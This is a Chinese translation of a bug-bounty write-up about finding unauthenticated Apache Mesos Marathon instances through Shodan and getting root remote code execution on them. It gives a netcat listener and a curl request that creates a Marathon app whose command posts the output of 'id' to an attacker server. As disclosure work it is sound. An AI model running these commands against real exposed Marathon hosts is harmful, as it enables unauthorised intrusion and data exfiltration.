***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**  

![](https://image.3001.net/images/20190909/1568008860_5d75ea9cb6ddc.png!small)

**大家好，今天要和大家分享的是，作者在Shodan搜索中发现某应用系统Marathon服务的无需密码验证bug，进一步提权形成RCE漏洞。作为一名开发工程师，作者通过发现该漏洞得到的经验是：在做漏洞众测时，具备一定的开发背景经验非常重要，if
you know how something works, you might be able to break
it，只有了解目标应用的工作机制，才能有效地发现它存在的问题。最终作者凭借该漏洞获得厂商$$,$$$上万美金的奖励。**

##  漏洞概要

某应用系统的容器编排平台Marathon服务实例的root权限RCE漏洞。Marathon是一个生产级别的容器（Docker）编排平台，用于中间层的数据中心操作系统(DC/OS)和Apache
Mesos。Apache
Mesos是一个分布式系统的管理软件，可对集群资源进行分配管理。Marathon算是一个基于Mesos的私有PaaS，它实现了Mesos的Framework，Marathon通过HAProxy实现服务发现和负载平衡，并为部署环境提供提供REST
API服务、授权和SSL、配置约束等功能。

因此，由于Marathon是Apache
mesos的一个编排平台，这意味着用户可以根据自己的需要安排要执行的任务，就像执行一条条简单的bash命令(类似于cronjobs这样的命令)。

##  漏洞复现

某天，当我在Shodan搜索东西时，由于之前的项目需要，我必须要自己架设一些Marathon/Mesos/Spark之类的实例，所以我就自然想到了通过Shodan来看看，有哪些大公司在生产环境中部署了Marathon服务，但却未做任何访问权限验证措施的。因此，我就按照“ssl:Redacted”
“X-Marathon-Leader”这样的语法，在Shodan中进行查找，最后，还真发现了一些有意思的东西，如以下两个搜索结果：

![](https://image.3001.net/images/20190909/1568008453_5d75e90577449.png!small)

它们是访问响应状态码为HTTP/1.1 200
OK的两个Marathon服务实例，虽然不能百分百肯定，但这种200响应码的Marathon服务，90%的可能说明无需任何密码验证即可访问。

于是，我立即按照Shodan中的显示结果，打开了目标应用的Marathon服务链接：[https://XXX.XXX.XXX.XXX/ui/#/apps](https://xxx.xxx.xxx.xxx/ui/#/apps)
，之后就真的无需密码验证，立马就进入了Marathon的主界面，如下：

![](https://image.3001.net/images/20190909/1568008471_5d75e9179b93e.png!small)

这样一来，我就可以在我自己的服务器上来部署监听上述Marathon服务的实例了，通过此种方法，间接实例对Marathon服务的的远程代码执行（RCE），方法如下：

1、在我自己的服务器上设置对端口55555的监听：

    
    
    #set your own server to wait the response
    
        root@h0st:~# nc -lvvv 55555

2、用Curl命令创建一个 Marathon
服务运行实例，并通过该实例来执行cmd命令，其中的attacker_server即为我服务器的IP地址。具体命令如下：

    
    
    # create a marathon application that will be execute any command that you want (in this case is /usr/bin/wget --user-agent=marathon-id --post-data=`id`)
    
        # replace attacker_server with your listening server that you set up with netcat and the "rce-id" tag with your own custom tag, this is the Marathon application name
    
        curl -sk -X POST -H "Content-type: application/json" [https://XXX.XXX.XXX.XXX/v2/apps](https://xxx.xxx.xxx.xxx/v2/apps) -d '{ "mem": 16, "id": "rce-id", "cmd": "/usr/bin/wget --user-agent=marathon-id --post-data=`id` attacker_server:55555"}'

3、再打开[https://XXX.XXX.XXX.XXX/ui/#/apps](https://xxx.xxx.xxx.xxx/ui/#/apps)
的Marathon服务管理界面，可以看到其中已经包含了一个名为“rce-id”的实例，这就是我们刚刚用curl命令创建的。在我的自架服务器中，稍等一会，就能看到XXX.XXX.XXX.XXX响应回来的cmd命令输出结果：

![](https://image.3001.net/images/20190909/1568008521_5d75e9498c093.png!small)

PS：测试过后，为了不对目标应用系统造成安全影响，我及时从Marathon界面中删除了创建的“rce-id”实例。
整个过程中，就用到了netcat、curl命令和浏览器，另外，当然主要还是Shodan很给力了。

***参考来源：[omespino](https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/)，clouds编译整理，转载请注明来自FreeBuf.COM**

  

